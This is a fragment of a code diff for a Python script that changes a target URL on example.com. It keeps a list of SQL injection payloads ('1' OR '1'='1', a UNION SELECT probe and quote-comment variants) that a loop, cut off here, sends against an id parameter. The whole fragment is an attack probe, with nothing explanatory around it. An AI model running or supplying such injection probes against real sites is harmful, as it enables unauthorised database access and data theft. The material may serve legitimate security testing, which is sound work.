@@ -1,6 +1,7 @@
 import requests
 
-url = "http://example.com/product?id="
+url = "http://example.com/?id="
+
 payloads = ["1'", "1'--", "1' OR '1'='1", "1' UNION SELECT null,null--"]
 
 for p in payloads:
